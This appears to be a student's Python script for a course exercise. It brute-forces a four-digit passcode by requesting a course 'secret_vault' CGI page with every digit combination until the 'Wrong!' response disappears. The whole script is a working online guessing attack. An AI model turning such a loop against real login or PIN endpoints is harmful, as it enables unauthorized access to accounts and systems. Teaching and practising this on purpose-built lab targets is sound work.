import urllib.request

#how to brute force hack a passcode 
#define variables for each digit
dig1 = 0 
dig2 = 0
dig3 = 0
dig4 = 0
#listed while loop for when one digit gets done, it moves on to the next one
while True:
    if dig4 != 9:
        dig4 += 1
    else:
        dig4 = 0
        if dig3 != 9:
            dig3 += 1
        else:
            dig3 = 0
            if dig2 != 9:
                dig2 += 1
            else:
                dig2 = 0
                if dig1 != 9:
                    dig1 += 1
                else:
                    dig1 = 0
#opens the URL and checks to see if its the real passcode
    url = "http://cgi.soic.indiana.edu/~bdemares/secret_vault.cgi?"
    url += "groupname=Group+7&num1=" + str(dig1) + "&num2=" + str(dig2) + "&num3=" + str(dig3) + "&num4=" + str(dig4)

    web_page = urllib.request.urlopen(url)
    lines = web_page.read().decode(errors = "replace")
    web_page.close()

    print(url)
#if statement that checks when the right passcode is in place
    if "<p>Wrong!</p>" not in lines:
#string that once its not in the URL printed page, it will stop
        break
